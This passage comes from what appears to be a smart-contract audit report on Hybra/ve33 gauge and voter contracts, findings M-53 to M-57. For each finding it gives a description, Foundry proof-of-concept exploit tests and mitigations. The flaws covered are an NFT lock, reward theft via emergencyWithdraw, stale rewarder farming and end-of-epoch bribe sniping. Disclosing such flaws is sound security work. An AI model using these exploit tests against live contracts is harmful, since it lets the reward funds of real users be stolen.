        // Expect grief revert from malicious rHYBR
        vm.expectRevert(bytes("grief"));
        gauge.withdraw(1, 0);
        // Ownership is unchanged – NFT still custodied by the gauge
        assertEq(nfpm.ownerOf(1), address(gauge), "NFT should remain in gauge custody");
    }
}


## Suggested Mitigation
Decouple NFT exit from untrusted reward conversion.
- Add a withdrawWithoutClaim (or a skipClaim flag) so users can recover their NFT even if rHYBR is paused/reverting.
- Wrap the rHYBR calls in _getReward with try/catch. On failure, do not delete rewards[tokenId] and continue the withdraw flow. Only set/delete the reward accounting after a successful conversion. Example pattern:
  1) uint256 amt = rewards[tokenId]; if (amt == 0) return; 2) rewardToken.safeApprove(rHYBR, 0); rewardToken.safeApprove(rHYBR, amt);
  3) try IRHYBR(rHYBR).depostionEmissionsToken(amt) { try IRHYBR(rHYBR).redeemFor(amt, redeemType, account) { delete rewards[tokenId]; } catch { /* leave rewards[tokenId] intact; emit event; do not revert */ } } catch { /* same: preserve rewards */ }
- Optionally, split claim into a separate claim() callable by users at any time, so reward conversion failures never block custody operations.
These changes ensure custody/liveness does not depend on an external contract and users can always exit.





 **Derived From** : After withdraw(tokenId, redeemType) by the staker: nonfungiblePositionManager.ownerOf(tokenId) == msg.sender

## [M-53]. GaugeCL.withdraw can permanently lock staked NFPM NFTs for contract stakers that are not ERC721 receivers

## Derived From Pattern/Invariant
After withdraw(tokenId, redeemType) by the staker: nonfungiblePositionManager.ownerOf(tokenId) == msg.sender

## Exploit Type
StandardViolation

## Location
GaugeCL.withdraw

## Minimim Privilege Required
Permissionless

## Description
GaugeCL.withdraw always transfers the NFT back to msg.sender via NFPM.safeTransferFrom(address(this), msg.sender, tokenId). If the staker is a contract without ERC721Receiver (onERC721Received), NFPM.safeTransferFrom will revert on transfer to that contract, making withdraw unusable and leaving the NFT stuck in the gauge. Deposit succeeds because transfer is to the Gauge (which implements IERC721Receiver), so the user only discovers the issue on exit. This violates the invariant that withdrawing must return custody of the NFT back to the staker.

Vulnerable snippet (end of withdraw):

        _stakes[msg.sender].remove(tokenId);
        nonfungiblePositionManager.safeTransferFrom(address(this), msg.sender, tokenId);

There is no withdraw-to alternative or fallback path, so non-receiver contracts cannot recover their NFTs.

## Impact
Contracts without ERC721Receiver that stake NFPM NFTs into GaugeCL cannot withdraw: withdraw() always safeTransfers back to msg.sender and reverts for non-receiver contracts. This permanently strands the NFT inside the gauge for that class of stakers (asset loss for affected users). The issue does not impact EOAs or receiver-enabled contracts, but any integration contract that deposits without implementing onERC721Received will brick its position on exit.

## Proof of Concept
Steps to reproduce
1) Deploy GaugeCL with a mock NFPM and pool.
2) Deploy a NonReceiver contract that does NOT implement IERC721Receiver.
3) Mint or set up a position tokenId owned by NonReceiver with non-zero liquidity and matching pool params.
4) NonReceiver calls gauge.deposit(tokenId) → succeeds (Gauge is an ERC721Receiver, so deposit safeTransfer succeeds).
5) NonReceiver calls gauge.withdraw(tokenId, redeemType) → Gauge attempts safeTransferFrom(address(this), NonReceiver, tokenId) and reverts because NonReceiver lacks onERC721Received.
6) The call reverts and the NFT remains owned by the gauge indefinitely, with no alternate path to recover.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {GaugeCL} from "contracts/CLGauge/GaugeCL.sol";

contract MockCLPool {
    uint256 public lastUpdatedTS;
    uint256 public rewardGrowthGlobal;
    uint256 public rewardReserve_;
    uint256 public stakedLiq;
    address public token0_;
    address public token1_;

    constructor() { lastUpdatedTS = block.timestamp; }
    function updateRewardsGrowthGlobal() external { lastUpdatedTS = block.timestamp; }
    function getRewardGrowthInside(int24, int24, uint256) external view returns (uint256) { return 0; }
    function stake(int128 liq, int24, int24, bool) external { if (liq >= 0) stakedLiq += uint128(liq); else stakedLiq -= uint128(-liq); }
    function lastUpdated() external view returns (uint256) { return lastUpdatedTS; }
    function rewardGrowthGlobalX128() external view returns (uint256) { return rewardGrowthGlobal; }
    function rewardReserve() external view returns (uint256) { return rewardReserve_; }
    function stakedLiquidity() external view returns (uint256) { return stakedLiq; }
    function syncReward(uint256, uint256, uint256) external {}
    function gaugeFees() external view returns (uint256, uint256) { return (0, 0); }
    function collectFees() external {}
    function token0() external view returns (address) { return token0_; }
    function token1() external view returns (address) { return token1_; }
}

contract MockCLFactory {
    address public pool;
    constructor(address _pool) { pool = _pool; }
    function getPool(address, address, int24) external view returns (address) { return pool; }
}

interface INFPM {
    struct CollectParams { uint256 tokenId; address recipient; uint128 amount0Max; uint128 amount1Max; }
}

contract MockNFPM {
    struct Pos { address token0; address token1; int24 tickSpacing; int24 tickLower; int24 tickUpper; uint128 liq; }
    mapping(uint256 => Pos) internal P;
    mapping(uint256 => address) public ownerOf; // public getter like ERC721
    mapping(uint256 => address) public getApproved;
    address public factory;

    constructor(address _factory) { factory = _factory; }

    // Configure position for tests
    function setPosition(uint256 tokenId, address token0, address token1, int24 tickSpacing, int24 tickLower, int24 tickUpper, uint128 liq) external {
        P[tokenId] = Pos({token0: token0, token1: token1, tickSpacing: tickSpacing, tickLower: tickLower, tickUpper: tickUpper, liq: liq});
    }
    function setOwner(uint256 tokenId, address o) external { ownerOf[tokenId] = o; }

    function positions(uint256 tokenId) external view returns (
        uint96, address, address token0, address token1, int24 tickSpacing,
        int24 tickLower, int24 tickUpper, uint128 liquidity,
        uint256, uint256, uint128, uint128
    ) {
        Pos memory x = P[tokenId];
        return (0, address(0), x.token0, x.token1, x.tickSpacing, x.tickLower, x.tickUpper, x.liq, 0, 0, 0, 0);
    }

    function approve(address to, uint256 tokenId) external { require(msg.sender == ownerOf[tokenId], "NA"); getApproved[tokenId] = to; }

    function collect(INFPM.CollectParams calldata) external payable returns (uint256, uint256) { return (0, 0); }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        require(msg.sender == ownerOf[tokenId] || msg.sender == getApproved[tokenId], "NA");
        require(ownerOf[tokenId] == from, "from");
        ownerOf[tokenId] = to;
        if (to.code.length > 0) {
            bytes4 ret = IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, "");
            require(ret == IERC721Receiver.onERC721Received.selector, "no recv");
        }
    }
}

contract NonReceiver { // intentionally lacks IERC721Receiver
    function depositToGauge(GaugeCL g, uint256 tokenId) external { g.deposit(tokenId); }
    function withdrawFromGauge(GaugeCL g, uint256 tokenId, uint8 redeemType) external { g.withdraw(tokenId, redeemType); }
}

contract GaugeCL_Withdraw_LocksNFT_Test is Test {
    MockCLPool pool;
    MockCLFactory clFactory;
    MockNFPM nfpm;
    GaugeCL gauge;
    NonReceiver user;

    address rewardToken = address(0x1001);
    address rHYBR = address(0x1002);
    address ve = address(0x1003);
    address distribution = address(0x1004);

    function setUp() public {
        pool = new MockCLPool();
        clFactory = new MockCLFactory(address(pool));
        nfpm = new MockNFPM(address(clFactory));
        gauge = new GaugeCL(address(rewardToken), rHYBR, ve, address(pool), distribution, address(0), address(0), true, address(nfpm), address(0));
        user = new NonReceiver();

        // Configure a valid position for tokenId=1
        uint256 tokenId = 1;
        nfpm.setPosition(tokenId, address(0xAAA1), address(0xAAA2), int24(60), int24(-120), int24(120), uint128(1));
        nfpm.setOwner(tokenId, address(user));

        // Approve is optional here (owner calls transfer), but include for realism
        vm.prank(address(user));
        nfpm.approve(address(gauge), tokenId);

        // Deposit succeeds (gauge implements IERC721Receiver)
        vm.prank(address(user));
        user.depositToGauge(gauge, tokenId);
        assertEq(nfpm.ownerOf(tokenId), address(gauge), "gauge should own NFT after deposit");
    }

    function testWithdrawRevertsForNonERC721ReceiverAndNFTRemainsInGauge() public {
        uint256 tokenId = 1;
        vm.prank(address(user));
        vm.expectRevert();
        user.withdrawFromGauge(gauge, tokenId, 0);
        assertEq(nfpm.ownerOf(tokenId), address(gauge), "NFT remains stuck in gauge");
    }
}


## Suggested Mitigation
Add a withdrawTo pattern so the staker can nominate a recipient that can accept ERC-721s:
- function withdrawTo(uint256 tokenId, address to, uint8 redeemType) external nonReentrant isNotEmergency { ... nonfungiblePositionManager.safeTransferFrom(address(this), to, tokenId); }
- Keep the existing checks for accounting and rewards but replace msg.sender with an explicit recipient for the NFT transfer. For fee collection and reward redemption you may still credit msg.sender to avoid surprises.
- Optionally add a pre-check: require(to.code.length == 0 || IERC165(to).supportsInterface(type(IERC721Receiver).interfaceId), "recipient not ERC721Receiver"); to provide a clear error early.
Additionally, to prevent new positions from becoming stuck, either:
- Disallow deposits from contracts that are not ERC721 receivers (revert with a helpful message), or
- Document clearly that contracts without onERC721Received must use withdrawTo to an EOA or receiver-capable contract.
Avoid switching to transferFrom unconditionally, as it may send NFTs to contracts that cannot operate on them and create new forms of loss without explicit user opt-in.





 **Derived From** : Emergency withdraw skips reward index update; rewards misaccounting possible

## [M-54]. GaugeV2 emergencyWithdraw paths let remaining stakers steal past emissions by skipping reward checkpointing

## Derived From Pattern/Invariant
Emergency withdraw skips reward index update; rewards misaccounting possible

## Exploit Type
AccountingInvariantViolation

## Location
GaugeV2.emergencyWithdraw / emergencyWithdrawAmount

## Minimim Privilege Required
Permissionless

## Description
GaugeV2.emergencyWithdraw and emergencyWithdrawAmount reduce _totalSupply/_balances without calling updateReward. Because rewardPerToken() accrues using (now - lastUpdateTime) * rewardRate / current _totalSupply, if many users exit via emergencyWithdraw and one small staker remains (or joins later), the next update (e.g., getReward) apportions all elapsed emissions since the last checkpoint over a tiny _totalSupply. This lets the remaining staker capture rewards for periods when a large supply was staked, while emergency exiters permanently forfeit their matured rewards. Vulnerable snippet:

function emergencyWithdraw() external nonReentrant {
    require(emergency, "EMER");
    uint256 _amount = _balanceOf(msg.sender);
    _totalSupply = _totalSupply - _amount;
    _balances[msg.sender] = 0;
    TOKEN.safeTransfer(msg.sender, _amount);
}

function emergencyWithdrawAmount(uint256 _amount) external nonReentrant {
    require(emergency, "EMER");
    _totalSupply = _totalSupply - _amount;
    _balances[msg.sender] = _balances[msg.sender] - _amount;
    TOKEN.safeTransfer(msg.sender, _amount);
}

## Impact
If the owner activates emergency mode, any remaining staker can harvest the entire elapsed emissions since the last checkpoint using a tiny _totalSupply divisor, while exiting users permanently forfeit matured rewards because their exit skips checkpointing. This causes reward mis-accounting and unfair redistribution during emergency, but requires the admin to toggle emergency mode first.

## Proof of Concept
1) Two users deposit: Alice=1000, Attacker=1.
2) DISTRIBUTION notifies reward R for 1 DURATION.
3) Time passes; no updateReward called yet (lastUpdateTime at notify).
4) Owner activates emergency; Alice calls emergencyWithdraw (no updateReward), leaving tiny _totalSupply.
5) Attacker calls getReward while emergency is active. updateReward computes the entire elapsed emissions since notify, divided by the now tiny _totalSupply, awarding almost the whole epoch to the attacker.
6) Alice’s matured rewards are lost; attacker receives nearly all reward tokens.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeV2} from "ve33/contracts/GaugeV2.sol";
import {HYBR} from "ve33/contracts/HYBR.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockRHYBR {
    address public immutable rewardToken;
    constructor(address _rewardToken) { rewardToken = _rewardToken; }
    function depostionEmissionsToken(uint256 amount) external {
        // Gauge has approved this contract; pull tokens in
        IERC20(rewardToken).transferFrom(msg.sender, address(this), amount);
    }
    function redeemFor(uint256 amount, uint8 /*redeemType*/, address recipient) external {
        IERC20(rewardToken).transfer(recipient, amount);
    }
}

contract GaugeV2_EmergencyAccounting_Test is Test {
    GaugeV2 gauge;
    HYBR stakeToken; // LP mock
    HYBR rewardToken; // emissions token
    MockRHYBR rHYBR;

    address owner = address(this);
    address distribution = address(this);
    address alice = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        // Deploy mock tokens (HYBR has mint() gated by minter set to deployer)
        stakeToken = new HYBR();
        rewardToken = new HYBR();
        rHYBR = new MockRHYBR(address(rewardToken));

        // Deploy gauge (isForPair=false; bribe addrs zero)
        gauge = new GaugeV2(
            address(rewardToken),
            address(rHYBR),
            address(0),
            address(stakeToken),
            distribution,
            address(0),
            address(0),
            false
        );

        // Fund users and approve
        stakeToken.mint(alice, 1_000e18);
        stakeToken.mint(attacker, 1e18);
        vm.prank(alice); stakeToken.approve(address(gauge), type(uint256).max);
        vm.prank(attacker); stakeToken.approve(address(gauge), type(uint256).max);

        // Both deposit before emissions start
        vm.prank(alice);   gauge.deposit(1_000e18);
        vm.prank(attacker);gauge.deposit(1e18);

        // Notify rewards for one duration
        uint256 reward = 1_000e18;
        rewardToken.mint(address(this), reward);
        rewardToken.approve(address(gauge), reward);
        gauge.notifyRewardAmount(address(rewardToken), reward);
    }

    function testEmergencyWithdrawStealsPastEmissions() public {
        // Let some time elapse before mass exit
        vm.warp(block.timestamp + 900); // half of test WEEK (1800)

        // Activate emergency and drain large staker without updating rewards
        gauge.activateEmergencyMode();
        vm.prank(alice); gauge.emergencyWithdraw(); // NO updateReward here!

        // Fast-forward to end of period
        uint256 pf = gauge.periodFinish();
        vm.warp(pf);

        // Attacker harvests while being effectively the sole staker
        vm.prank(attacker); gauge.getReward(0);

        // Attacker captures nearly entire epoch emissions; Alice forfeits
        uint256 attackerR = rewardToken.balanceOf(attacker);
        uint256 aliceR = rewardToken.balanceOf(alice);
        assertGt(attackerR, 990e18); // >99% of 1000e18
        assertEq(aliceR, 0);
    }
}


## Suggested Mitigation
Call updateReward(msg.sender) before mutating balances/supply in both emergencyWithdraw and emergencyWithdrawAmount to checkpoint rewards at the pre-exit supply and credit the exiting user. Optionally also notify gaugeRewarder for consistency. Example:

function emergencyWithdraw() external nonReentrant updateReward(msg.sender) {
    require(emergency, "EMER");
    uint256 _amount = _balanceOf(msg.sender);
    require(_amount > 0, "ZV");
    _totalSupply -= _amount;
    _balances[msg.sender] = 0;
    TOKEN.safeTransfer(msg.sender, _amount);
    emit Withdraw(msg.sender, _amount);
}

function emergencyWithdrawAmount(uint256 _amount) external nonReentrant updateReward(msg.sender) {
    require(emergency, "EMER");
    _totalSupply -= _amount;
    _balances[msg.sender] -= _amount;
    TOKEN.safeTransfer(msg.sender, _amount);
    emit Withdraw(msg.sender, _amount);
}





 **Derived From** : Emergency withdraw fails to sync sidecar rewarder (power/rewards not revoked)

## [M-55]. GaugeV2.emergencyWithdraw fails to call rewarder.onReward, allowing users to keep delegated balance and farm external rewards after pulling LP

## Derived From Pattern/Invariant
Emergency withdraw fails to sync sidecar rewarder (power/rewards not revoked)

## Exploit Type
AuthByPass

## Location
GaugeV2.emergencyWithdraw

## Minimim Privilege Required
Permissionless

## Description
Normal deposit/withdraw paths call the sidecar rewarder to sync delegated balance: IRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account)). However, emergencyWithdraw and emergencyWithdrawAmount do not, leaving the rewarder’s internal userBalance stale. An attacker can deposit, get their delegated balance set in the rewarder, then, once emergency mode is activated, use emergencyWithdraw to remove all LP while retaining full delegated power in the rewarder and continue accruing/claiming sidecar rewards or governance weight. Vulnerable snippets:

// normal paths
if (address(gaugeRewarder) != address(0)) {
    IRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account));
}

// emergency paths (no onReward call)
function emergencyWithdraw() external nonReentrant { ... }
function emergencyWithdrawAmount(uint256 _amount) external nonReentrant { ... }

## Impact
Attacker can withdraw all LP but keep earning external sidecar rewards based on stale delegated balance, draining sidecar reward tokens and breaking reward fairness.

## Proof of Concept
1) Attacker deposits LP into GaugeV2; gauge calls rewarder.onReward and sets delegated balance = deposit.
2) Governance activates emergency mode (legitimate); attacker calls emergencyWithdraw to pull LP.
3) Because the emergency path does not call onReward, the rewarder still thinks attacker’s balance > 0.
4) New rewards are added to the rewarder; attacker claims them while having zero LP in the gauge.
5) Result: attacker extracts sidecar rewards unfairly post-withdrawal.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../contracts/GaugeV2.sol";

interface IERC20Mintable {
    function mint(address to, uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract MockERC20 is IERC20Mintable {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _n, string memory _s, uint8 _d) {
        name = _n; symbol = _s; decimals = _d;
    }

    function mint(address to, uint256 amount) external override {
        balanceOf[to] += amount; totalSupply += amount;
    }

    function approve(address spender, uint256 value) external override returns (bool) {
        allowance[msg.sender][spender] = value; return true;
    }

    function transfer(address to, uint256 value) external override returns (bool) {
        require(balanceOf[msg.sender] >= value, "bal");
        balanceOf[msg.sender] -= value; balanceOf[to] += value; return true;
    }

    function transferFrom(address from, address to, uint256 value) external override returns (bool) {
        require(balanceOf[from] >= value, "bal");
        require(allowance[from][msg.sender] >= value, "allow");
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value; balanceOf[to] += value; return true;
    }
}

// Minimal rewarder that accrues rewards by "delegated balance"
contract FakeRewarder is IRewarder {
    IERC20Mintable public rewardToken;
    uint256 public accPerShare; // scaled by 1e12
    uint256 public totalDelegated;

    mapping(address => uint256) public delegated;
    mapping(address => uint256) public rewardDebt; // delegated * accPerShare / 1e12
    mapping(address => uint256) public pending;

    constructor(address _rewardToken) { rewardToken = IERC20Mintable(_rewardToken); }

    // Gauge calls this to sync user's delegated balance
    function onReward(address user, address /*recipient*/, uint256 userBalance) external override {
        // settle pending for user based on previous delegation
        if (delegated[user] > 0) {
            uint256 accrued = (delegated[user] * accPerShare) / 1e12 - rewardDebt[user];
            pending[user] += accrued;
        }
        // update global and user delegated balances
        totalDelegated = totalDelegated - delegated[user] + userBalance;
        delegated[user] = userBalance;
        rewardDebt[user] = (delegated[user] * accPerShare) / 1e12;
    }

    // Fund must already be in this contract; just update index
    function distribute(uint256 amount) external {
        require(totalDelegated > 0, "no del");
        require(rewardToken.balanceOf(address(this)) >= amount, "fund");
        accPerShare += amount * 1e12 / totalDelegated;
    }

    function claim(address to) external {
        uint256 accrued = (delegated[msg.sender] * accPerShare) / 1e12 - rewardDebt[msg.sender];
        uint256 amount = pending[msg.sender] + accrued;
        pending[msg.sender] = 0;
        rewardDebt[msg.sender] = (delegated[msg.sender] * accPerShare) / 1e12;
        if (amount > 0) {
            rewardToken.transfer(to, amount);
        }
    }
}

contract GovernanceDelegationFlaw_EmergencyWithdraw_Test is Test {
    MockERC20 lp;
    MockERC20 ext; // sidecar reward token
    GaugeV2 gauge;
    FakeRewarder rew;
    address attacker = address(0xA11CE);

    function setUp() public {
        lp = new MockERC20("LP", "LP", 18);
        ext = new MockERC20("EXT", "EXT", 18);
        // construct gauge; rewardToken/rHYBR/VE not used in this test
        gauge = new GaugeV2(address(ext), address(0xdead), address(0xbeef), address(lp), address(0x1), address(0), address(0), false);
        rew = new FakeRewarder(address(ext));
        gauge.setGaugeRewarder(address(rew)); // onlyOwner: this test contract is owner
        // fund attacker with LP
        lp.mint(attacker, 100e18);
        vm.prank(attacker);
        lp.approve(address(gauge), type(uint256).max);
        // deposit sets delegated balance in rewarder via onReward
        vm.prank(attacker);
        gauge.deposit(100e18);
    }

    function testEmergencyWithdrawLeavesRewarderStaleAndAllowsClaim() public {
        // Owner activates emergency mode (legitimate action)
        gauge.activateEmergencyMode();
        // Attacker pulls all LP via emergencyWithdraw (no onReward called)
        vm.prank(attacker);
        gauge.emergencyWithdraw();
        // Delegated balance in rewarder remains stale (>0), while gauge balance is 0
        assertEq(gauge.balanceOf(attacker), 0);
        // Fund rewarder and distribute; attacker should still accrue based on stale delegation
        ext.mint(address(rew), 1000e18);
        rew.distribute(1000e18);
        uint256 pre = ext.balanceOf(attacker);
        vm.prank(attacker);
        rew.claim(attacker);
        uint256 post = ext.balanceOf(attacker);
        // Attacker profited from sidecar despite holding 0 LP in gauge
        assertGt(post - pre, 0);
    }
}


## Suggested Mitigation
In both emergencyWithdraw and emergencyWithdrawAmount, after updating _balances and _totalSupply, call the sidecar: if (gaugeRewarder != address(0)) IRewarder(gaugeRewarder).onReward(msg.sender, msg.sender, _balanceOf(msg.sender));. Consider also running updateReward(msg.sender) to checkpoint internal accounting. This revokes delegated power/reward accrual when users exit via emergency.





 **Derived From** : Emergency withdrawals bypass reward checkpointing, breaking rewards accounting

## [M-56]. GaugeV2.emergencyWithdraw[Amount] skips updateReward, burning users’ accrued emissions and stranding rewards in the gauge

## Derived From Pattern/Invariant
Emergency withdrawals bypass reward checkpointing, breaking rewards accounting

## Exploit Type
AccountingInvariantViolation

## Location
GaugeV2.emergencyWithdraw

## Minimim Privilege Required
Permissionless

## Description
In GaugeV2, both emergencyWithdraw and emergencyWithdrawAmount mutate _balances/_totalSupply without calling updateReward(account). As a result, a user’s accrued rewards since their last checkpoint are never added to rewards[account]. After their balance is set to 0, earned(account) = rewards[account] + 0*(...) = rewards[account] (typically 0), so the matured emissions for that user are effectively lost. Those tokens remain in the contract balance, breaking the emissions == claimed + unclaimed invariant and potentially skewing future distribution logic. Vulnerable snippets:

function emergencyWithdraw() external nonReentrant {
    require(emergency, "EMER");
    uint256 _amount = _balanceOf(msg.sender);
    require(_amount > 0, "ZV");
    _totalSupply = _totalSupply - _amount;
    _balances[msg.sender] = 0; // no updateReward(msg.sender)
    TOKEN.safeTransfer(msg.sender, _amount);
}

function emergencyWithdrawAmount(uint256 _amount) external nonReentrant {
    require(emergency, "EMER");
    _totalSupply = _totalSupply - _amount;
    _balances[msg.sender] = _balances[msg.sender] - _amount; // no updateReward(msg.sender)
    TOKEN.safeTransfer(msg.sender, _amount);
}

## Impact
When emergency is enabled, any user calling emergencyWithdraw or emergencyWithdrawAmount forfeits all matured rewards accrued since their last checkpoint because updateReward(account) is not called before zeroing/reducing balance. Additionally, these functions change _totalSupply without first updating rewardPerTokenStored/lastUpdateTime, retroactively applying the new supply to the entire interval since the previous checkpoint. This breaks proportional distribution for the current interval (over/under-allocating rewards to remaining stakers) and strands tokens in the contract relative to users’ claimed + unclaimed state.

## Proof of Concept
Setup: A user deposits LP, emissions are notified and accrue over time. Owner toggles emergency=true. The user calls emergencyWithdraw. Because updateReward was not called, their accrued rewards are never credited to rewards[user]; balance is set to 0; earned(user) collapses to 0. Meanwhile, reward tokens remain in the gauge balance. Also, since _totalSupply changed without updating lastUpdateTime/rewardPerTokenStored, rewardPerToken() uses the new lower supply for the entire uncheckpointed interval, skewing distribution to remaining stakers.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeV2} from "../contracts/GaugeV2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

// Minimal stub for IRHYBR functions invoked by GaugeV2.getReward
contract DummyRHYBR {
    function depostionEmissionsToken(uint256) external {}
    function redeemFor(uint256, uint8, address) external {}
}

contract GaugeV2_EmergencyWithdraw_RewardLossTest is Test {
    address internal user = address(0xA11CE);

    MockERC20 internal reward;
    MockERC20 internal lp;
    DummyRHYBR internal r;
    GaugeV2 internal gauge;

    function setUp() public {
        reward = new MockERC20("HYBR", "HYBR");
        lp = new MockERC20("LP", "LP");
        r = new DummyRHYBR();
        // DISTRIBUTION = address(this) so tests can call notifyRewardAmount
        gauge = new GaugeV2(address(reward), address(r), address(0), address(lp), address(this), address(0), address(0), false);
    }

    function test_EmergencyWithdrawForfeitsAccruedRewards_andStrandsInGauge() public {
        // 1) User deposits
        uint256 depositAmt = 10e18;
        lp.mint(user, depositAmt);
        vm.startPrank(user);
        lp.approve(address(gauge), type(uint256).max);
        gauge.deposit(depositAmt);
        vm.stopPrank();

        // 2) Notify emissions (DISTRIBUTION is this test contract)
        uint256 emission = 1000e18;
        reward.mint(address(this), emission);
        reward.approve(address(gauge), emission);
        gauge.notifyRewardAmount(address(reward), emission);

        // 3) Warp to period end so all rewards are accrued
        uint256 finish = gauge.periodFinish();
        vm.warp(finish);

        // Sanity: user has positive earned prior to emergency
        uint256 pre = gauge.earned(user);
        assertGt(pre, 0, "user should have accrued rewards before emergency");

        // 4) Owner activates emergency; user emergency withdraws
        gauge.activateEmergencyMode();
        vm.prank(user);
        gauge.emergencyWithdraw();

        // 5) User’s earned collapses; gauge still holds reward tokens
        uint256 post = gauge.earned(user);
        uint256 gaugeBal = reward.balanceOf(address(gauge));

        assertEq(post, 0, "user’s accrued rewards are lost after emergencyWithdraw");
        assertEq(gaugeBal, emission, "emission remains in gauge (no one claimed)");

        // Invariant intuition: claimed + accounted(unclaimed across users) < actual balance in gauge
        // Here with one user, accounted = post = 0, balance = emission
        assertGt(gaugeBal, post, "stranded rewards not reflected in accounting");
    }
}


## Suggested Mitigation
In both emergencyWithdraw and emergencyWithdrawAmount, checkpoint rewards before mutating balances/supply: add updateReward(msg.sender) so user accrual is credited and global rewardPerTokenStored/lastUpdateTime are advanced for the pre-change interval. Optionally, call the gaugeRewarder hook to keep auxiliary rewarders in sync. If the intended design is to force forfeiture on emergency exit, explicitly account and emit a Forfeited event and accumulate a forfeited counter so emitted == claimed + unclaimed + forfeited holds. Example:

function emergencyWithdraw() external nonReentrant updateReward(msg.sender) { /* then mutate _balances/_totalSupply and transfer */ }
function emergencyWithdrawAmount(uint256 _amount) external nonReentrant updateReward(msg.sender) { /* then mutate and transfer */ }





 **Derived From** : lastVoted[tokenId] == HybraTimeLibrary.epochStart(lastVotedTimestamp[tokenId]) + 1

## [M-57]. Bribe sniping: end-of-epoch votes capture full-epoch bribes due to missing vote-end window in VoterV3.vote

## Derived From Pattern/Invariant
lastVoted[tokenId] == HybraTimeLibrary.epochStart(lastVotedTimestamp[tokenId]) + 1

## Exploit Type
TimestampDependentLogic

## Location
VoterV3.vote

## Minimim Privilege Required
Permissionless

## Description
VoterV3.vote records lastVoted to the current epoch (epochStart(now)+1) and only blocks re-voting within the same epoch. It enforces a no-vote window only at the start of the epoch (DW via epochVoteStart), but not at the end. Combined with Bribe’s end-of-epoch checkpointing (rewards are computed from the last checkpoint in the epoch), an attacker can wait until the final seconds of the epoch, cast their first vote of the epoch, and still receive a proportional share of the entire epoch’s bribes. Honest voters who held votes throughout the epoch are diluted by an attacker’s last-second vote. Vulnerable snippet in VoterV3:

- modifier onlyNewEpoch: only checks early-window and lastVoted by epoch, not end-of-epoch close
  if (HybraTimeLibrary.epochStart(block.timestamp) <= lastVoted[_tokenId]) revert("VOTED");
  if (block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp)) revert("DW");
- vote(): lastVoted set to epochStart(block.timestamp)+1; no check against epochVoteEnd()
  lastVoted[_tokenId] = HybraTimeLibrary.epochStart(block.timestamp) + 1;
  lastVotedTimestamp[_tokenId] = block.timestamp;

HybraTimeLibrary exposes epochVoteEnd() and isLastHour(), but they are never enforced in VoterV3.

## Impact
A veNFT holder can wait until the last seconds of an epoch, cast their first vote of that epoch, and receive a proportional share of the entire epoch’s bribes, because Bribe.earned() uses the last checkpoint in the epoch and VoterV3 allows voting until epoch end. This dilutes honest voters who maintained weight all epoch and can be repeated every epoch. The economic loss equals the attacker’s end-of-epoch share of each epoch’s bribe deposits; no capital/time commitment alignment is enforced.

## Proof of Concept
Root cause: VoterV3 allows votes after epochVoteEnd; Bribe.earned() computes each epoch’s share using the last checkpoint before epoch end. Thus, a vote at T = epochEnd - 1 is counted as if it applied to the entire epoch.
High-level steps:
1) Briber deposits X tokens into Bribe during epoch N (notifyRewardAmount records tokenRewardsPerEpoch[epochStart(N)] += X).
2) Attacker has not voted yet in epoch N. Seconds before epoch end, attacker votes for a pool (VoterV3.onlyNewEpoch allows this since only the early DW window is enforced). VoterV3 deposits weight into both internal and external Bribes, creating a balance checkpoint at T ≈ epochEnd - 1.
3) In epoch N+1, attacker (via GaugeManager) calls Bribe.getReward(tokenId,[reward]). earned() selects the last checkpoint inside epoch N for the attacker and the epoch’s last supply checkpoint, so the attacker’s end-of-epoch balance is used to split the entire X reward, granting them their full proportional share despite minimal time-in-epoch.

## Proof of Code
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {VoterV3} from "ve33/contracts/VoterV3.sol";
import {Bribe} from "ve33/contracts/Bribe.sol";
import {HybraTimeLibrary} from "ve33/contracts/libraries/HybraTimeLibrary.sol";

interface IMockVE {
    function token() external view returns (address);
    function isApprovedOrOwner(address, uint256) external view returns (bool);
    function balanceOfNFT(uint256) external view returns (uint256);
    function voting(uint256) external;
    function abstain(uint256) external;
    function ownerOf(uint256) external view returns (address);
}

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals; uint public totalSupply;
    mapping(address=>uint) public balanceOf; mapping(address=>mapping(address=>uint)) public allowance;
    constructor(string memory n,string memory s,uint8 d){name=n;symbol=s;decimals=d;}
    function mint(address to,uint amt) external { balanceOf[to]+=amt; totalSupply+=amt; }
    function approve(address sp,uint amt) external returns(bool){ allowance[msg.sender][sp]=amt; return true; }
    function transfer(address to,uint amt) external returns(bool){ require(balanceOf[msg.sender]>=amt); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address from,address to,uint amt) external returns(bool){ require(balanceOf[from]>=amt && allowance[from][msg.sender]>=amt); allowance[from][msg.sender]-=amt; balanceOf[from]-=amt; balanceOf[to]+=amt; return true; }
}

contract MockVE is IMockVE {
    address public override token; mapping(uint=>address) public ownerOfMap;
    constructor(address _token){ token=_token; }
    function setOwner(uint id, address o) external { ownerOfMap[id]=o; }
